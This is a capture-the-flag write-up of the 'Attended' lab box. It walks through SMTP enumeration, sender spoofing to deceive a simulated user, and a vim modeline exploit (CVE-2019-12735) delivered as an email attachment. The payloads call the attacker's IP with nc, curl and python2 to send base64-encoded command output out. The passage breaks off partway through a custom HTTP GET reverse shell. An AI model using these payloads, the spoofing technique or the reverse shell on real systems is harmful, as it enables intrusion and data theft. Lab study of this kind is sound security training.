# ATTENDED
![GitHub Logo](/ATTENDED.png)

```
OS: OpenBSD
Difficulty: Insane
Points: 50
Release: 19 Dec 2020
IP: 10.10.10.221
```
## Scanning the target with NMAP
```shell
┌──(root💀622e2dcf8e46)-[/]
└─# nmap -sSV -Pn -T4 -O 10.129.43.114
Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times will be slower.
Starting Nmap 7.91 ( https://nmap.org ) at 2021-02-09 21:42 UTC
Nmap scan report for 10.129.43.114
Host is up (0.032s latency).
Not shown: 998 filtered ports
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.0 (protocol 2.0)
25/tcp open  smtp
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port25-TCP:V=7.91%I=7%D=2/9%Time=602301BF%P=x86_64-pc-linux-gnu%r(NULL,
SF:3C,"220\x20proudly\x20setup\x20by\x20guly\x20for\x20attended\.htb\x20ES
SF:MTP\x20OpenSMTPD\r\n")%r(Hello,72,"220\x20proudly\x20setup\x20by\x20gul
SF:y\x20for\x20attended\.htb\x20ESMTP\x20OpenSMTPD\r\n501\x205\.5\.1\x20In
SF:valid\x20command:\x20EHLO\x20requires\x20domain\x20name\r\n")%r(Help,D5
SF:,"220\x20proudly\x20setup\x20by\x20guly\x20for\x20attended\.htb\x20ESMT
SF:P\x20OpenSMTPD\r\n214-\x20This\x20is\x20OpenSMTPD\r\n214-\x20To\x20repo
SF:rt\x20bugs\x20in\x20the\x20implementation,\x20please\x20contact\x20bugs
SF:@openbsd\.org\r\n214-\x20with\x20full\x20details\r\n214\x202\.0\.0:\x20
SF:End\x20of\x20HELP\x20info\r\n")%r(GenericLines,71,"220\x20proudly\x20se
SF:tup\x20by\x20guly\x20for\x20attended\.htb\x20ESMTP\x20OpenSMTPD\r\n500\
SF:x205\.5\.1\x20Invalid\x20command:\x20Pipelining\x20not\x20supported\r\n
SF:")%r(GetRequest,71,"220\x20proudly\x20setup\x20by\x20guly\x20for\x20att
SF:ended\.htb\x20ESMTP\x20OpenSMTPD\r\n500\x205\.5\.1\x20Invalid\x20comman
SF:d:\x20Pipelining\x20not\x20supported\r\n");
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
OS fingerprint not ideal because: Missing a closed TCP port so results incomplete
No OS matches for host

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 31.84 seconds
```

Our nmap scan shows a limited attack surface with two open ports. First there´s **OpenSSH 8.0** running on **port 22**. I could not find any serious vulnerabilities that could be used to attack this service at this time. We could do a bruteforce attack on SSH but let´s use bruteforce as the absolutley last option and go on to check the other service. 

**OpenSMTPD** is running on **port 25**. This software has recently had some serious vulnerabilities (**CVE 2020-7247, CVE-2020-8794**). At this point we do not know what verison of the service that is running here and if it´s vulnerable to these CVE:s. We can see from the banner grabbing that the SMTP-server responds: **"220 proudly setup by guly for attended.htb ESMTP OpenSMTPD"**. So here we found an important piece of information, there might be a user on this system called **Guly**. Now let´s connect to the SMTP-service and see if we can interact with it, attack it or find more information.
 

## Interacting with OpenSMTPD

### Sending an email with netcat

First let´s just connect to the service and see if we can interact manually. Our tool for this is netcat. This link https://www.linuxjournal.com/content/sending-email-netcat has some useful information about interacting with SMTP using netcat.

```shell
┌──(root💀c974b36640ee)-[/]
└─# nc 10.129.101.78 25
220 proudly setup by guly for attended.htb ESMTP OpenSMTPD
HELO hacker.hackz.net
250 proudly setup by guly for attended.htb Hello hacker.hackz.net [10.10.14.161], pleased to meet you
MAIL FROM:<hacker@attended.htb>
250 2.0.0: Ok
RCPT TO:<guly@attended.htb>
250 2.1.5 Destination address valid: Recipient ok
DATA 
354 Enter mail, end with "." on a line by itself
From: [Hacker] <hacker@attended.htb>
To: [Guly] <guly@attended.htb>
Date: Mon, 22 Feb 2021 14:38:35 +0100
Subject: Pwn

Hi there!
I will hack you!!!

/Hacker

.
250 2.0.0: 06419fc2 Message accepted for delivery
QUIT
221 2.0.0: Bye
```

Success, we can send mail to the user guly. So where do we go from here? I tried to exploit the CVE:s mentioned earlier (**CVE 2020-7247, CVE-2020-8794**). I tried the first one https://www.exploit-db.com/exploits/47984 but could not succeed with an attack. The other one https://www.trendmicro.com/en_us/research/20/c/opensmtpd-vulnerability-cve-2020-8794-can-lead-to-root-privilege-escalation-and-remote-code-execution.html requiers that you can respond to an incoming connection from the targets SMTP-server. So let´s install our own SMTP-server and see if we can get the target to connect to us.

### Receving email with Python SMTP

Let´s setup an SMTP-server so we can receive incoming mails. We do not want to go through the burden of setting up a complete SMTP-system if it´s not absolutley necesary. So we start of with the built in smtpd in python. This is a small module for debuging purposes just like the http.server module.

```shell
┌──(root💀1beee4a144d6)-[/]
└─# python -m smtpd -n -c DebuggingServer 0.0.0.0:25
```

With an SMTP-server active locally we can try sending an email to Guly once again and see if we can get an response. But we got to remember that there´s no complete SMTP and DNS system that supports us here inside HTB. One technique that I have used before is sending the emails from an address like hacker@[10.10.10.10] so the server knows where to respond without relying on DNS. But if we are going to start sending emails back and forth and perhaps repeatedly try some attack we need a better tool than netcat. So lets get some useful tool.

### Send email with swaks

Once again I will use a tool that I tried before. It´s called swaks and can be used to send emails from the command line. There´s plenty of examples on their webage here: http://www.jetmore.org/john/code/swaks/ Let us just try to send an email to guly@attended.htb from hacker@attended.htb and see if anything happens. We can try the hacker@[10.10.10.10] syntax later if nothing happens.

```shell
┌──(root💀591fd0a9b267)-[/]
└─# swaks --to guly@attended.htb --from hacker@attended.htb --body "Gonna Pwn you" --server attended.htb
=== Trying attended.htb:25...
=== Connected to attended.htb.
<-  220 proudly setup by guly for attended.htb ESMTP OpenSMTPD
 -> EHLO 591fd0a9b267
<-  250-proudly setup by guly for attended.htb Hello 591fd0a9b267 [10.10.14.161], pleased to meet you
<-  250-8BITMIME
<-  250-ENHANCEDSTATUSCODES
<-  250-SIZE 36700160
<-  250-DSN
<-  250 HELP
 -> MAIL FROM:<hacker@attended.htb>
<-  250 2.0.0: Ok
 -> RCPT TO:<guly@attended.htb>
<-  250 2.1.5 Destination address valid: Recipient ok
 -> DATA
<-  354 Enter mail, end with "." on a line by itself
 -> Date: Mon, 22 Feb 2021 17:12:15 +0000
 -> To: guly@attended.htb
 -> From: hacker@attended.htb
 -> Subject: test Mon, 22 Feb 2021 17:12:15 +0000
 -> Message-Id: <20210222171215.000013@591fd0a9b267>
 -> X-Mailer: swaks v20201014.0 jetmore.org/john/code/swaks/
 ->
 -> Gonna Pwn you
 ->
 ->
 -> .
<-  250 2.0.0: dab3707b Message accepted for delivery
 -> QUIT
<-  221 2.0.0: Bye
=== Connection closed with remote host.
```

Everything seems to be okay, the mail is delivered top Guly. Let´s just wait a minute or two to see if anything happens. After a while attended.htb responds! YES, major success we can make attended.htb respond back to us. Let´s analyze this:

```shell
┌──(root💀1beee4a144d6)-[/]
└─# python -m smtpd -n -c DebuggingServer 0.0.0.0:25
---------- MESSAGE FOLLOWS ----------
Received: from attended.htb (attended.htb [192.168.23.2])
        by attendedgw.htb (Postfix) with ESMTP id D210F32CCF
        for <hacker@10.10.14.161>; Mon, 22 Feb 2021 18:12:35 +0100 (CET)
Content-Type: multipart/alternative;
 boundary="===============2867695990242550080=="
MIME-Version: 1.0
Subject: Re: test Mon, 22 Feb 2021 17:12:15 +0000
From: guly@attended.htb
X-Peer: 172.17.0.1

--===============2867695990242550080==
Content-Type: text/plain; charset="us-ascii"
MIME-Version: 1.0
Content-Transfer-Encoding: 7bit

hello, thanks for writing.
i'm currently quite busy working on an issue with freshness and dodging any email from everyone but him. i'll get back in touch as soon as possible.


---
guly

OpenBSD user since 1995
Vim power user

/"\
\ /  ASCII Ribbon Campaign
 X   against HTML e-mail
/ \  against proprietary e-mail attachments

--===============2867695990242550080==--
------------ END MESSAGE ------------
---------- MESSAGE FOLLOWS ----------
Received: from attended.htb (attended.htb [192.168.23.2])
        by attendedgw.htb (Postfix) with ESMTP id AD76632CCF
        for <hacker@10.10.14.161>; Mon, 22 Feb 2021 18:18:35 +0100 (CET)
Content-Type: multipart/alternative;
 boundary="===============0915568608889855989=="
MIME-Version: 1.0
Subject: Re: test Mon, 22 Feb 2021 17:17:41 +0000
From: guly@attended.htb
X-Peer: 172.17.0.1

--===============0915568608889855989==
Content-Type: text/plain; charset="us-ascii"
MIME-Version: 1.0
Content-Transfer-Encoding: 7bit

hello, thanks for writing.
i'm currently quite busy working on an issue with freshness and dodging any email from everyone but him. i'll get back in touch as soon as possible.


---
guly

OpenBSD user since 1995
Vim power user

/"\
\ /  ASCII Ribbon Campaign
 X   against HTML e-mail
/ \  against proprietary e-mail attachments

--===============0915568608889855989==--
------------ END MESSAGE ------------
```

First of all, it´s a bit strange that the mail could find it´s way back to us since we said we were user hacker@attanden.htb!!! But we have to remember that HTB is merely trying to simulate real world scenarios the best way possible. Probably there´s some script on the other side that checks what mail-server it came from and contacts back to that IP, we just have to imagine that a real user answered us here.

Second thing it was attended.htb that answered back to us but there´s also this line:

```by attendedgw.htb (Postfix) with ESMTP id D210F32CCF```

So there´s another node involved in this. Let´s take notes that attendedgw.htb is out there and it´s running Postfix. Add there´s more.

```
hello, thanks for writing.
i'm currently quite busy working on an issue with freshness and dodging any email from everyone but him. i'll get back in touch as soon as possible.
```

So here´s some more interesting information, there seems to be a user called freshness an guly will only respond on messages from this user. Okay, that pretty much gives us an idea of what to try next. We should try to impersonate a mail from freshness to guly. But before we go on and  do that there´s another piece of information here:

```
OpenBSD user since 1995
Vim power user

/"\
\ /  ASCII Ribbon Campaign
 X   against HTML e-mail
/ \  against proprietary e-mail attachments
```

From this we can conclude that this guly character is some kind of a nerd that is truely into BSD he uses vi, he does not like html-formatted emails and he want´s his attachements in the standard format specified by the rfc. That´s good to know when we continue our conversation with him. Now let´s send an email from freshness to guly and see what happens:

```shell
┌──(root💀591fd0a9b267)-[/]
└─# swaks --to guly@attended.htb --from freshness@attended.htb --body "Gonna Pwn you" --server attended.htb
=== Trying attended.htb:25...
=== Connected to attended.htb.
<-  220 proudly setup by guly for attended.htb ESMTP OpenSMTPD
 -> EHLO 591fd0a9b267
<-  250-proudly setup by guly for attended.htb Hello 591fd0a9b267 [10.10.14.161], pleased to meet you
<-  250-8BITMIME
<-  250-ENHANCEDSTATUSCODES
<-  250-SIZE 36700160
<-  250-DSN
<-  250 HELP
 -> MAIL FROM:<freshness@attended.htb>
<-  250 2.0.0: Ok
 -> RCPT TO:<guly@attended.htb>
<-  250 2.1.5 Destination address valid: Recipient ok
 -> DATA
<-  354 Enter mail, end with "." on a line by itself
 -> Date: Mon, 22 Feb 2021 17:37:53 +0000
 -> To: guly@attended.htb
 -> From: freshness@attended.htb
 -> Subject: test Mon, 22 Feb 2021 17:37:53 +0000
 -> Message-Id: <20210222173753.000060@591fd0a9b267>
 -> X-Mailer: swaks v20201014.0 jetmore.org/john/code/swaks/
 ->
 -> Gonna Pwn you
 ->
 ->
 -> .
<-  250 2.0.0: 55b5b18b Message accepted for delivery
 -> QUIT
<-  221 2.0.0: Bye
=== Connection closed with remote host.
```

The email was delivered and after waiting a while.... success... we  receive another answer:

```shell
---------- MESSAGE FOLLOWS ----------
Received: from attended.htb (attended.htb [192.168.23.2])
        by attendedgw.htb (Postfix) with ESMTP id 6786132CCF
        for <freshness@10.10.14.161>; Mon, 22 Feb 2021 18:38:33 +0100 (CET)
Content-Type: multipart/alternative;
 boundary="===============6652596858845009622=="
MIME-Version: 1.0
Subject: Re: test Mon, 22 Feb 2021 17:37:53 +0000
From: guly@attended.htb
X-Peer: 172.17.0.1

--===============6652596858845009622==
Content-Type: text/plain; charset="us-ascii"
MIME-Version: 1.0
Content-Transfer-Encoding: 7bit

hi mate, could you please double check your attachment? looks like you forgot to actually attach anything :)

p.s.: i also installed a basic py2 env on gw so you can PoC quickly my new outbound traffic restrictions. i think it should stop any non RFC compliant connection.


---
guly

OpenBSD user since 1995
Vim power user

/"\
\ /  ASCII Ribbon Campaign
 X   against HTML e-mail
/ \  against proprietary e-mail attachments

--===============6652596858845009622==--
------------ END MESSAGE ------------
```

So here´s some more interesting information:

```
hi mate, could you please double check your attachment? looks like you forgot to actually attach anything :)

p.s.: i also installed a basic py2 env on gw so you can PoC quickly my new outbound traffic restrictions. i think it should stop any non RFC compliant connection.
```

It looks like guly is expecting a mail attachtment from freshness, well this is leadning us to know what to try next isn´t it? But first there´s even more information. Guly has set up a PoC using Python2 on the unattendedgw and he has implemented some kind of restrictions on outbound traffic so that only RFC-compliant traffic is allowed. That tells me that we should probably use SMTP and HTTP on their original ports, no netcat reverse shells and stuff like that. And we should keep to Python2 if we are able to get RCE. Well it´s about time we give Guly an attachement, let´s send him another mail with just a pointless attachement:

```shell
┌──(root💀591fd0a9b267)-[/]
└─# echo HAXX0R! > attachment
┌──(root💀591fd0a9b267)-[/]
└─# swaks --to guly@attended.htb --from freshness@attended.htb --body "Gonna Pwn you" --server attended.htb --attach attachment
*** DEPRECATION WARNING: Inferring a filename from the argument to --attach will be removed in the future.  Prefix filenames with '@' instead.
=== Trying attended.htb:25...
=== Connected to attended.htb.
<-  220 proudly setup by guly for attended.htb ESMTP OpenSMTPD
 -> EHLO 591fd0a9b267
<-  250-proudly setup by guly for attended.htb Hello 591fd0a9b267 [10.10.14.161], pleased to meet you
<-  250-8BITMIME
<-  250-ENHANCEDSTATUSCODES
<-  250-SIZE 36700160
<-  250-DSN
<-  250 HELP
 -> MAIL FROM:<freshness@attended.htb>
<-  250 2.0.0: Ok
 -> RCPT TO:<guly@attended.htb>
<-  250 2.1.5 Destination address valid: Recipient ok
 -> DATA
<-  354 Enter mail, end with "." on a line by itself
 -> Date: Mon, 22 Feb 2021 17:50:50 +0000
 -> To: guly@attended.htb
 -> From: freshness@attended.htb
 -> Subject: test Mon, 22 Feb 2021 17:50:50 +0000
 -> Message-Id: <20210222175050.000064@591fd0a9b267>
 -> X-Mailer: swaks v20201014.0 jetmore.org/john/code/swaks/
 -> MIME-Version: 1.0
 -> Content-Type: multipart/mixed; boundary="----=_MIME_BOUNDARY_000_64"
 ->
 -> ------=_MIME_BOUNDARY_000_64
 -> Content-Type: text/plain
 ->
 -> Gonna Pwn you
 -> ------=_MIME_BOUNDARY_000_64
 -> Content-Type: application/octet-stream; name="attachment"
 -> Content-Description: attachment
 -> Content-Disposition: attachment; filename="attachment"
 -> Content-Transfer-Encoding: BASE64
 ->
 -> SEFYWDBSIQo=
 ->
 -> ------=_MIME_BOUNDARY_000_64--
 ->
 ->
 -> .
<-  250 2.0.0: 96090f25 Message accepted for delivery
 -> QUIT
<-  221 2.0.0: Bye
=== Connection closed with remote host.
```

After waiting just a little while we recive a response from Guly:

```
---------- MESSAGE FOLLOWS ----------
Received: from attended.htb (attended.htb [192.168.23.2])
        by attendedgw.htb (Postfix) with ESMTP id B655132CCF
        for <freshness@10.10.14.161>; Mon, 22 Feb 2021 18:51:34 +0100 (CET)
Content-Type: multipart/alternative;
 boundary="===============1721011292393987844=="
MIME-Version: 1.0
Subject: Re: test Mon, 22 Feb 2021 17:50:50 +0000
From: guly@attended.htb
X-Peer: 172.17.0.1

--===============1721011292393987844==
Content-Type: text/plain; charset="us-ascii"
MIME-Version: 1.0
Content-Transfer-Encoding: 7bit

thanks dude, i'm currently out of the office but will SSH into the box immediately and open your attachment with vim to verify its syntax.
if everything is fine, you will find your config file within a few minutes in the /home/shared folder.
test it ASAP and let me know if you still face that weird issue.


---
guly

OpenBSD user since 1995
Vim power user

/"\
\ /  ASCII Ribbon Campaign
 X   against HTML e-mail
/ \  against proprietary e-mail attachments

--===============1721011292393987844==--
------------ END MESSAGE ------------

```

Once again this guy is giving away too much information. 

```
thanks dude, i'm currently out of the office but will SSH into the box immediately and open your attachment with vim to verify its syntax.
if everything is fine, you will find your config file within a few minutes in the /home/shared folder.
test it ASAP and let me know if you still face that weird issue.
```

At this point you start to wonder if this is really an insane rated box? Every step is obvious from the mails you recive. But you will regret even thinking that later on. Now guly tells us that he is using SSH to log in to the box, he opens email attachements with vi (I sure know what kind of vulnerabilities to google for). Guly is plannning to deliver some kind of config file to freshness in the /home/shared folder. Interesting things to take notes of. NOW, let´s google for some kind of vim vulnerabilities.

### Attack our target with a VIM RCE vulnerability

Let´s google for "vim exploit" and instantly we find CVE-2019–12735 and a PoC for that vulnerability https://github.com/numirias/security/blob/master/doc/2019-06-04_ace-vim-neovim.md This is a rather old vulnerability but it´s worth trying when everything we learnet this far is pointing in that direction. To exploit something on the other side we need to construct an attchment which looks something like this:

```shell
:!uname -a||" vi:fen:fdm=expr:fde=assert_fails("source\!\ \%"):fdl=0:fdt="
```

When a user with the vulnarble verison of vim opens a file with this content tha commans "uname -a" will execute. Thats kind of pointless when we can´t see what is happening remote. We need to get some kind of response back to us. First I thought about sending an email back but not knowing what software is installed on the other side that seems like a guessing game I like to avoid. Let´s try to get an http request back to us. 

First of all we need a web server to listen for incoming http requests. We use the good old http.server and let´s stay on port 80 to avoid problems with Gulys traffic restrictions.

```shell
┌──(root💀0037d6b5f811)-[/]
└─# python3 -m http.server 80
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
```

So now we have server listening. Let´s try a few different payloads. We could try netcat or curl and perhaps python2 since Guly mentioned that it´s was installed on the attandedgw. Let´s create these three variants and check if some of them works.

```
:!echo HELO | nc 10.10.14.161 80||" vi:fen:fdm=expr:fde=assert_fails("source\!\ \%"):fdl=0:fdt="

:!curl 10.10.14.161||" vi:fen:fdm=expr:fde=assert_fails("source\!\ \%"):fdl=0:fdt="

:!python2 -c 'import requests;requests.get("http://10.10.14.161");'||" vi:fen:fdm=expr:fde=assert_fails("source\!\ \%"):fdl=0:fdt="
``` 

Let´s put one of the line above inside a file called payload.txt and then attach that file and send it to Guly.

```shell
┌──(root💀591fd0a9b267)-[/]
└─# swaks --to guly@attended.htb --from freshness@attended.htb --body "Gonna Pwn you" --server attended.htb --attach payload.txt
*** DEPRECATION WARNING: Inferring a filename from the argument to --attach will be removed in the future.  Prefix filenames with '@' instead.
=== Trying attended.htb:25...
=== Connected to attended.htb.
<-  220 proudly setup by guly for attended.htb ESMTP OpenSMTPD
 -> EHLO 591fd0a9b267
<-  250-proudly setup by guly for attended.htb Hello 591fd0a9b267 [10.10.14.161], pleased to meet you
<-  250-8BITMIME
<-  250-ENHANCEDSTATUSCODES
<-  250-SIZE 36700160
<-  250-DSN
<-  250 HELP
 -> MAIL FROM:<freshness@attended.htb>
<-  250 2.0.0: Ok
 -> RCPT TO:<guly@attended.htb>
<-  250 2.1.5 Destination address valid: Recipient ok
 -> DATA
<-  354 Enter mail, end with "." on a line by itself
 -> Date: Mon, 22 Feb 2021 19:14:26 +0000
 -> To: guly@attended.htb
 -> From: freshness@attended.htb
 -> Subject: test Mon, 22 Feb 2021 19:14:26 +0000
 -> Message-Id: <20210222191426.000144@591fd0a9b267>
 -> X-Mailer: swaks v20201014.0 jetmore.org/john/code/swaks/
 -> MIME-Version: 1.0
 -> Content-Type: multipart/mixed; boundary="----=_MIME_BOUNDARY_000_144"
 ->
 -> ------=_MIME_BOUNDARY_000_144
 -> Content-Type: text/plain
 ->
 -> Gonna Pwn you
 -> ------=_MIME_BOUNDARY_000_144
 -> Content-Type: application/octet-stream; name="payload.txt"
 -> Content-Description: payload.txt
 -> Content-Disposition: attachment; filename="payload.txt"
 -> Content-Transfer-Encoding: BASE64
 ->
 -> OiFweXRob24yIC1jICdpbXBvcnQgcmVxdWVzdHM7cmVxdWVzdHMuZ2V0KCJodHRwOi8vMTAuMTAu
 -> MTQuMTYxIik7J3x8IiB2aTpmZW46ZmRtPWV4cHI6ZmRlPWFzc2VydF9mYWlscygic291cmNlXCFc
 -> IFwlIik6ZmRsPTA6ZmR0PSIK
 ->
 -> ------=_MIME_BOUNDARY_000_144--
 ->
 ->
 -> .
<-  250 2.0.0: 5b8f2dfb Message accepted for delivery
 -> QUIT
<-  221 2.0.0: Bye
=== Connection closed with remote host.
```

Almost at the same time as we can see the mail reply from Guly arive at our mail server we get this at our http server:

```shell
┌──(root💀0037d6b5f811)-[/]
└─# python3 -m http.server 80
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
172.17.0.1 - - [22/Feb/2021 19:15:19] "GET / HTTP/1.1" 200 -
```

Wonderful! We can´t establish a reverse shell or use tools like netcat or curl but we can execute python remote and we can get http request sent back to us. Now we need to craft some better payloads and start exfiltrating data. Let´s start with a simple "ls -la" just to see if we can execute it and get stuff back. We can base64 encode the result of our os command and send that as the name of a document that we wish to access. Not very stealthy but our payload looks like this:

```
:!python2 -c 'import os,base64,requests;requests.get("http://10.10.14.161/" + base64.b64encode(bytes(os.popen("ls -la").read())))'||" vi:fen:fdm=expr:fde=assert_fails("source\!\ \%"):fdl=0:fdt="
```

We put that into our payload.txt and send it to guly:

```shell
┌──(root💀591fd0a9b267)-[/]
└─# swaks --to guly@attended.htb --from freshness@attended.htb --body "Gonna Pwn you" --server attended.htb --attach payload.txt
*** DEPRECATION WARNING: Inferring a filename from the argument to --attach will be removed in the future.  Prefix filenames with '@' instead.
=== Trying attended.htb:25...
=== Connected to attended.htb.
<-  220 proudly setup by guly for attended.htb ESMTP OpenSMTPD
 -> EHLO 591fd0a9b267
<-  250-proudly setup by guly for attended.htb Hello 591fd0a9b267 [10.10.14.161], pleased to meet you
<-  250-8BITMIME
<-  250-ENHANCEDSTATUSCODES
<-  250-SIZE 36700160
<-  250-DSN
<-  250 HELP
 -> MAIL FROM:<freshness@attended.htb>
<-  250 2.0.0: Ok
 -> RCPT TO:<guly@attended.htb>
<-  250 2.1.5 Destination address valid: Recipient ok
 -> DATA
<-  354 Enter mail, end with "." on a line by itself
 -> Date: Mon, 22 Feb 2021 19:39:42 +0000
 -> To: guly@attended.htb
 -> From: freshness@attended.htb
 -> Subject: test Mon, 22 Feb 2021 19:39:42 +0000
 -> Message-Id: <20210222193942.000182@591fd0a9b267>
 -> X-Mailer: swaks v20201014.0 jetmore.org/john/code/swaks/
 -> MIME-Version: 1.0
 -> Content-Type: multipart/mixed; boundary="----=_MIME_BOUNDARY_000_182"
 ->
 -> ------=_MIME_BOUNDARY_000_182
 -> Content-Type: text/plain
 ->
 -> Gonna Pwn you
 -> ------=_MIME_BOUNDARY_000_182
 -> Content-Type: application/octet-stream; name="payload.txt"
 -> Content-Description: payload.txt
 -> Content-Disposition: attachment; filename="payload.txt"
 -> Content-Transfer-Encoding: BASE64
 ->
 -> OiFweXRob24yIC1jICdpbXBvcnQgb3MsYmFzZTY0LHJlcXVlc3RzO3JlcXVlc3RzLmdldCgiaHR0
 -> cDovLzEwLjEwLjE0LjE2MS8iICsgYmFzZTY0LmI2NGVuY29kZShieXRlcyhvcy5wb3BlbigibHMg
 -> LWxhIikucmVhZCgpKSkpJ3x8IiB2aTpmZW46ZmRtPWV4cHI6ZmRlPWFzc2VydF9mYWlscygic291
 -> cmNlXCFcIFwlIik6ZmRsPTA6ZmR0PSIK
 ->
 -> ------=_MIME_BOUNDARY_000_182--
 ->
 ->
 -> .
<-  250 2.0.0: dc22dca3 Message accepted for delivery
 -> QUIT
<-  221 2.0.0: Bye
=== Connection closed with remote host.
```

After some waiting we get a http request back to our http server:

```shell
172.17.0.1 - - [22/Feb/2021 19:40:32] code 404, message File not found
172.17.0.1 - - [22/Feb/2021 19:40:32] "GET /dG90YWwgNjQKZHJ3eHIteC0tLSAgNCBndWx5ICBndWx5ICAgIDUxMiBGZWIgMjIgMjA6MzEgLgpkcnd4ci14ci14ICA1IHJvb3QgIHdoZWVsICAgNTEyIEp1biAyNiAgMjAxOSAuLgotcnctci0tci0tICAxIGd1bHkgIGd1bHkgICAgIDg3IEFwciAxMyAgMjAxOSAuWGRlZmF1bHRzCi1ydy1yLS1yLS0gIDEgZ3VseSAgZ3VseSAgICA3NzEgQXByIDEzICAyMDE5IC5jc2hyYwotcnctci0tci0tICAxIGd1bHkgIGd1bHkgICAgMTAxIEFwciAxMyAgMjAxOSAuY3ZzcmMKLXJ3LXItLXItLSAgMSBndWx5ICBndWx5ICAgIDM1OSBBcHIgMTMgIDIwMTkgLmxvZ2luCi1ydy1yLS1yLS0gIDEgZ3VseSAgZ3VseSAgICAxNzUgQXByIDEzICAyMDE5IC5tYWlscmMKLXJ3LXItLXItLSAgMSBndWx5ICBndWx5ICAgIDIxNSBBcHIgMTMgIDIwMTkgLnByb2ZpbGUKZHJ3eC0tLS0tLSAgMiByb290ICB3aGVlbCAgIDUxMiBKdW4gMjYgIDIwMTkgLnNzaAotcnctLS0tLS0tICAxIGd1bHkgIGd1bHkgICAgICAwIERlYyAxNSAxNzowNSAudmltaW5mbwotcnctci0tLS0tICAxIGd1bHkgIGd1bHkgICAgIDEzIEp1biAyNiAgMjAxOSAudmltcmMKLXJ3LXItLXItLSAgMSBndWx5ICBndWx5ICAgIDI2OCBGZWIgMjIgMjA6MDQgY2xpZW50LnB5Ci1yd3hyd3hyd3ggIDEgcm9vdCAgZ3VseSAgIDY3ODkgRGVjICA0IDA5OjA3IGdjaGVja2VyLnB5Ci1ydy0tLS0tLS0gIDEgZ3VseSAgZ3VseSAgICAgIDAgRmViIDIyIDIwOjMxIG1ib3gKZHJ3eHIteHIteCAgMiBndWx5ICBndWx5ICAgIDUxMiBKdW4gMjYgIDIwMTkgdG1wCg== HTTP/1.1" 404 -
```

Nice we seem to have exfiltrated some data. Let´s decode it and see what we got:

```shell
┌──(root💀591fd0a9b267)-[/]
└─# echo dG90YWwgNjQKZHJ3eHIteC0tLSAgNCBndWx5ICBndWx5ICAgIDUxMiBGZWIgMjIgMjA6MzEgLgpkcnd4ci14ci14ICA1IHJvb3QgIHdoZWVsICAgNTEyIEp1biAyNiAgMjAxOSAuLgotcnctci0tci0tICAxIGd1bHkgIGd1bHkgICAgIDg3IEFwciAxMyAgMjAxOSAuWGRlZmF1bHRzCi1ydy1yLS1yLS0gIDEgZ3VseSAgZ3VseSAgICA3NzEgQXByIDEzICAyMDE5IC5jc2hyYwotcnctci0tci0tICAxIGd1bHkgIGd1bHkgICAgMTAxIEFwciAxMyAgMjAxOSAuY3ZzcmMKLXJ3LXItLXItLSAgMSBndWx5ICBndWx5ICAgIDM1OSBBcHIgMTMgIDIwMTkgLmxvZ2luCi1ydy1yLS1yLS0gIDEgZ3VseSAgZ3VseSAgICAxNzUgQXByIDEzICAyMDE5IC5tYWlscmMKLXJ3LXItLXItLSAgMSBndWx5ICBndWx5ICAgIDIxNSBBcHIgMTMgIDIwMTkgLnByb2ZpbGUKZHJ3eC0tLS0tLSAgMiByb290ICB3aGVlbCAgIDUxMiBKdW4gMjYgIDIwMTkgLnNzaAotcnctLS0tLS0tICAxIGd1bHkgIGd1bHkgICAgICAwIERlYyAxNSAxNzowNSAudmltaW5mbwotcnctci0tLS0tICAxIGd1bHkgIGd1bHkgICAgIDEzIEp1biAyNiAgMjAxOSAudmltcmMKLXJ3LXItLXItLSAgMSBndWx5ICBndWx5ICAgIDI2OCBGZWIgMjIgMjA6MDQgY2xpZW50LnB5Ci1yd3hyd3hyd3ggIDEgcm9vdCAgZ3VseSAgIDY3ODkgRGVjICA0IDA5OjA3IGdjaGVja2VyLnB5Ci1ydy0tLS0tLS0gIDEgZ3VseSAgZ3VseSAgICAgIDAgRmViIDIyIDIwOjMxIG1ib3gKZHJ3eHIteHIteCAgMiBndWx5ICBndWx5ICAgIDUxMiBKdW4gMjYgIDIwMTkgdG1wCg== | base64 -d
total 64
drwxr-x---  4 guly  guly    512 Feb 22 20:31 .
drwxr-xr-x  5 root  wheel   512 Jun 26  2019 ..
-rw-r--r--  1 guly  guly     87 Apr 13  2019 .Xdefaults
-rw-r--r--  1 guly  guly    771 Apr 13  2019 .cshrc
-rw-r--r--  1 guly  guly    101 Apr 13  2019 .cvsrc
-rw-r--r--  1 guly  guly    359 Apr 13  2019 .login
-rw-r--r--  1 guly  guly    175 Apr 13  2019 .mailrc
-rw-r--r--  1 guly  guly    215 Apr 13  2019 .profile
drwx------  2 root  wheel   512 Jun 26  2019 .ssh
-rw-------  1 guly  guly      0 Dec 15 17:05 .viminfo
-rw-r-----  1 guly  guly     13 Jun 26  2019 .vimrc
-rw-r--r--  1 guly  guly    268 Feb 22 20:04 client.py
-rwxrwxrwx  1 root  guly   6789 Dec  4 09:07 gchecker.py
-rw-------  1 guly  guly      0 Feb 22 20:31 mbox
drwxr-xr-x  2 guly  guly    512 Jun 26  2019 tmp
```

Niiiiiice we have a foothold and can start diging around inside attended.htb using the credentials of Guly. Up until this point I struggled a bit with the payloads and getting a response back through http but most stuff was straight forward. From now on there was a harder times. After sending a few mails back and forth you get tired of waiting 2 minutes to get the results of your commands. You really miss that reverse shell. But what about a reverse shell over http? I tried a few things in python and realised that HTTP/POST did not come through. So I assumed that we had to rely on HTTP/GET top be sure of passing through Gulys restrictions.

After some googling I decided not to try any of the existing http reverse shells. Many of them used HTTP/POST or cookies which I was not sure of would work. Instead of wasting any more time on that I decided to write my own simple http reverse shell based on only HTTP/GET.

### HTTP/GET reverse shell

I found some basc code on the internet that I stripped from HTTP/POST and added my own little touch. The server side listens for requests and establishes a connection with the client (the victim). When we get a regular HTTP/GET we get a command from our user and send it to the client for execution. When we get a HTTP/GET including a ? we know that it´s the result of the last command and we decode and print it.

```python
import requests
import BaseHTTPServer
import base64

class request_handler(BaseHTTPServer.BaseHTTPRequestHandler):

   def log_request(self, code):
      pass
   
   def do_GET(sf): 
      if "?" in sf.path:
         print(base64.b64decode(sf.path.split("?")[1]))
         sf.send_response(200)
         sf.end_headers()
         sf.wfile.write("OK")
      else:
         remote_cmd = raw_input("$ ")
         sf.send_response(200)
         sf.end_headers()
